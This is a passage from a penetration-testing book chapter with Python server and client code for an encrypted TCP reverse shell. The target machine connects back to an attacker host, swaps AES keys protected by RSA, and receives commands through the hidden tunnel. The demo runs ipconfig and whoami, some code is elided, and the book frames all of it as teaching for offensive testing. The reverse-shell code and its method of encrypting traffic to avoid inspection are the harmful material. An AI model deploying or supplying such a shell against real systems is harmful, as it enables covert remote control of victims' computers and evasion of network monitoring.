<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># Hybrid - Server- TCP Reverse Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>from Crypto.PublicKey import RSA<br class="title-page-name"/>from Crypto.Cipher import AES<br class="title-page-name"/>import string<br class="title-page-name"/>import random<br class="title-page-name"/><br class="title-page-name"/>def encrypt_AES_KEY(KEY):<br class="title-page-name"/><br class="title-page-name"/>    publickey ="""-----BEGIN PUBLIC KEY-----<br class="title-page-name"/>...<br class="title-page-name"/>-----END PUBLIC KEY-----"""<br class="title-page-name"/><br class="title-page-name"/>    encryptor = RSA.importKey(publickey)<br class="title-page-name"/>    encriptedData=encryptor.encrypt(KEY, 0)<br class="title-page-name"/>    return encriptedData[0]<br class="title-page-name"/><br class="title-page-name"/></pre>
<p class="calibre2"><span class="calibre11">Upon completing the TCP three-way handshake, we will create two random values, which are the </span><kbd class="calibre12">key</kbd><span class="calibre11"> and the </span><kbd class="calibre12">counter</kbd><span class="calibre11">. Their values are a combination of an uppercase, lowercase, digits, and special characters. Before going to the infinite loop—which will be used to transfer the command that we want to be executed—we'll encrypt these values with the target's public key and then send it over:</span></p>
<pre class="packt_figure">...<br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    <br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br class="title-page-name"/>    s.bind(("10.10.10.100", 8080)) <br class="title-page-name"/>    s.listen(1)                                                        <br class="title-page-name"/>    print '[+] Listening for incoming TCP connection on port 8080'<br class="title-page-name"/>    conn, addr = s.accept() <br class="title-page-name"/>    print '[+] We got a connection from: ', addr<br class="title-page-name"/>    global key<br class="title-page-name"/>    key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\') for _ in range(32))<br class="title-page-name"/>    print "Generated AES Key " + str(key)<br class="title-page-name"/>    conn.send ( encrypt_AES_KEY(key) )<br class="title-page-name"/>    global counter<br class="title-page-name"/>    counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\') for _ in range(16))<br class="title-page-name"/>    conn.send ( encrypt_AES_KEY(counter) )<br class="title-page-name"/> ...</pre>
<p class="calibre2"><span class="calibre11">On the target side, and also before going into the infinite loop, we will decrypt the key and the counter that we have received from the Kali machine; we will do this encryption using our private key. Then, we will store them in a global variable, which will be used for AES encryption. One more time, this will happen before going to the infinite loop. The definition of our private key is under a function called </span><kbd class="calibre12">GET_AES_KEY()</kbd><span class="calibre11">. So, at this point, we get the key and the </span><kbd class="calibre12">counter</kbd><span class="calibre11"> values, and as I said, we'll use them for AES encryption. So, the encrypt function and the decrypt function are used to protect our commands that will be going back and forth between the Kali and the Windows machines. Now, once we are within the infinite loop, we will use the AES's stream mode to protect our tunnel later on:</span></p>
<pre class="packt_figure"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7<br class="title-page-name"/># http://www.voidspace.org.uk/python/modules.shtml#pycrypto<br class="title-page-name"/><br class="title-page-name"/># Download Pycrypto source<br class="title-page-name"/># https://pypi.python.org/pypi/pycrypto<br class="title-page-name"/># For Kali, after extract the tar file, invoke "python setup.py install"<br class="title-page-name"/><br class="title-page-name"/># Hybrid - Client - TCP Reverse Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/><br class="title-page-name"/>from Crypto.PublicKey import RSA<br class="title-page-name"/>from Crypto.Cipher import AES<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def GET_AES_KEY(KEY):<br class="title-page-name"/>    privatekey = """-----BEGIN RSA PRIVATE KEY-----<br class="title-page-name"/>...<br class="title-page-name"/>-----END RSA PRIVATE KEY-----"""<br class="title-page-name"/>    <br class="title-page-name"/>    decryptor = RSA.importKey(privatekey)<br class="title-page-name"/>    AES_Key = decryptor.decrypt(KEY) <br class="title-page-name"/>    return AES_Key<br class="title-page-name"/>...<br class="title-page-name"/>def connect():<br class="title-page-name"/>    <br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br class="title-page-name"/>    s.connect(('10.10.10.100', 8080))<br class="title-page-name"/>    global key, counter<br class="title-page-name"/>    x = s.recv(1024)<br class="title-page-name"/>    key = GET_AES_KEY( x )<br class="title-page-name"/>    print "Generated AES Key " + str(key)<br class="title-page-name"/>    y = s.recv(1024)<br class="title-page-name"/>    counter = GET_AES_KEY( y )<br class="title-page-name"/>     while True: <br class="title-page-name"/>        command = decrypt(s.recv(1024))<br class="title-page-name"/>        print ' We received: ' + command<br class="title-page-name"/>        <br class="title-page-name"/>...</pre>
<p class="calibre2">Now, let's run the scripts, start with the Kali side, then with Windows side. You will notice that once we fire up the target, we get a random AES key that gets generated on the Kali machine, which is then transferred to the target side.</p>
<p class="calibre2">If we open Wireshark and right-click on any IP and select <span class="calibre11">Follow TCP Stream</span>, we can see that the AES key gets transferred successfully after being encrypted with the target's public key.</p>
<p class="calibre2">So, once we get the key, everything that is being sent, will be encrypted using the AES's key stream. So, when we run <kbd class="calibre12">ipconfig</kbd> on the Kali machine and again click on <span class="calibre11">Follow TCP Stream</span>, <kbd class="calibre12">ipconfig</kbd> gets encrypted using the AES algorithm.</p>
<p class="calibre2">Let's try with another command, such as <kbd class="calibre12">whoami</kbd>. If we stop this session by typing <kbd class="calibre12">terminate</kbd> and then re-establish a new session, you will see that we will get a new random AES key generated as per the new session.</p>
<p class="calibre2">So, each time the target connects to the Kali machine, a new random key will be generated.</p>
<div class="packt_infobox">Technically speaking, you can enhance the script here and make both sides change the AES key after a certain amount of time or after certain amount of bytes being sent over, just like the IPSEC in VPN tunnel does.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we've discussed a wide range of topics ranging from introduction to encryption algorithms to discussing different types of algorithms. We've also implemented AES and RSA to protect the tunnel during passage of information.</p>
<p class="calibre2">With this, we've arrived at the end of the book! I hope you've learned some great techniques to test with Python.</p>


            </article>

            
        </section>
    </body></html>